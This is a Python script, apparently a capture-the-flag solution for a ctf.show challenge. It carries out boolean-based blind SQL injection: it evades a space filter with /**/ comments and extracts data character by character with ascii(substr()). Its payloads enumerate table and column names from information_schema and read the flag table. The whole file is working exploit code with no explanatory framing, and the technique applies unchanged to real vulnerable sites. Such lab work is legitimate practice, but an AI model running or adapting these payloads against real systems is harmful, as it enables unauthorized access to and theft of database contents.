# -*- coding:utf-8 -*-
import requests
s = requests.session()
url = "http://8b4dfc79-919a-49b4-9b7c-0778419182bf.chall.ctf.show/index.php"
table = ""

for i in range(1, 45):
    print(i)
    for j in range(31, 128):
        #爆表名  flag
        # payload = f"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/{str(i)}/**/for/**/1))={str(j)}#"
        #爆字段名 flag
        # payload = f"ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/{str(i)}/**/for/**/1))={str(j)}#"
        #读取flag
        payload = f"ascii(substr((select/**/flag/**/from/**/flag)from/**/{str(i)}/**/for/**/1))={str(j)}#"

        html_data = s.get(url=url + '?id=-1/**/or/**/' + payload).text

        if 'If' in html_data:
            table += chr(j)
            print(table)
            print('-' * 10)
            break
